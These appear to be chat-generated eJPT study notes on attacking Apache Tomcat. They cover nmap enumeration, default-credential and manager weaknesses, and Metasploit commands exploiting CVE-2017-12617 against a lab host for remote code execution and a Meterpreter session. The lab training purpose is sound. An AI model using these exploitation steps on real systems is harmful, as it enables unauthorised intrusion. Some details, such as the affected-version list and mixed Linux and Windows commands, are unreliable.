

---

# ☕ Apache Tomcat Enumeration & Exploitation — FULL DETAILED NOTES (EN)

---

## 1. What is Apache Tomcat?

**Apache Tomcat** is a **Java-based web server and servlet container** used to run:

- Java Servlets
    
- JSP (Java Server Pages)
    
- Java web applications
    

Often used in:

- Enterprise environments
    
- Internal applications
    
- Management panels
    

---

## 2. Default Tomcat Ports (VERY IMPORTANT)

|Port|Service|
|---|---|
|8080|HTTP (Tomcat Web Interface)|
|8009|AJP (Apache JServ Protocol)|
|8443|HTTPS (if enabled)|

📌 **Port 8080 open = HIGH value target**

---

## 3. Tomcat File Types

### JSP Files

- `.jsp`
    
- Executed server-side
    
- Equivalent to `.php` or `.aspx`
    

📌 Uploading a `.jsp` file = **Remote Code Execution**

---

## 4. Tomcat Enumeration with Nmap

### Full Port Scan (Lab Style)

```bash
nmap --top-ports 65536 demo.ine.local
```

Used to detect:

- 8080 (Tomcat)
    
- 8009 (AJP)
    
- Windows services (SMB, RDP, WinRM)
    

---

### Service Version Detection

```bash
nmap -sV -p 8080 demo.ine.local
```

Example output:

```
Apache Tomcat/Coyote JSP engine 8.5.20
```

---

## 5. Manual Tomcat Enumeration

### Access Tomcat Interface

```
http://demo.ine.local:8080
```

Check for:

- `/manager`
    
- `/host-manager`
    
- Version disclosure
    
- Default pages
    

---

## 6. Tomcat Authentication Weakness

### Common Issues:

- Default credentials
    
- Weak credentials
    
- Exposed manager interface
    

📌 Manager access = deploy WAR = RCE

---

## 7. Tomcat JSP Upload Bypass (CRITICAL LAB)

### Vulnerability

- **CVE-2017-12617**
    
- **JSP Upload Bypass**
    

### Affected Versions:

- Tomcat < 9.0.1 (Beta)
    
- Tomcat < 8.5.23
    
- Tomcat < 8.0.47
    
- Tomcat < 7.0.8
    

📌 Exactly what appears in **eJPT labs**

---

## 8. Tomcat Exploitation with Metasploit

### Search Module

```bash
search tomcat jsp
```

---

### Load Exploit

```bash
use exploit/multi/http/tomcat_jsp_upload_bypass
```

---

### Configure Target

```bash
set RHOSTS demo.ine.local
check
exploit
```

---

### Result

- Successful JSP upload
    
- Remote code execution
    
- Meterpreter session
    

---

## 9. Tomcat → File System Access

Once exploited:

```bash
cd /
ls
type flag.txt
```

📌 Same post-exploitation flow as IIS

---

## 10. Tomcat Attack Chain

Tomcat enum  
→ Version disclosure  
→ JSP upload bypass  
→ RCE  
→ Privilege escalation  
→ Pivoting

---

## 11. Tomcat + Windows Services (Cross-Section Link)

In labs, Tomcat often appears with:

- SMB (445)
    
- RDP (3389)
    
- WinRM (5985)
    

📌 Tomcat is often **initial access**, Windows services are **lateral movement**

---

## Tomcat — Exam Notes (eJPT)

- Always scan all ports
    
- Port 8080 = Tomcat candidate
    
- JSP = executable
    
- CVE-2017-12617 is common
    
- Metasploit module is enough
    

---

## Tomcat Summary

- Java web server
    
- Misconfiguration = RCE
    
- Common initial foothold in labs
    

---

🔥 **NEXT (still interlinked across sections):**

➡️ **RDP Enumeration & Attacks**  
➡️ **WinRM Enumeration & Exploitation**  
➡️ **Pivoting & Lateral Movement (AUTOROUTE, internal scans)**

مكمل تلقائي بـ **RDP** في الرد الجاي ⏭️